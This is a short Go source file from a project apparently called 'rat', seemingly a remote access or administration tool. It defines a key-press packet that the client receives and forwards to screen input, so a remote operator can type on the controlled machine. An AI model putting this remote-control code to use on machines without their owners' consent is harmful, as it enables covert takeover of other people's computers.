package main

import "rat/common"
import "rat/client/screen"

type KeyPacket struct {
	Key  int `receive`
	Type int `receive`
}

func (packet KeyPacket) Header() common.PacketHeader {
	return common.KeyHeader
}

func (packet KeyPacket) OnReceive() error {
	screen.Key(uint16(packet.Key), packet.Type)

	return nil
}
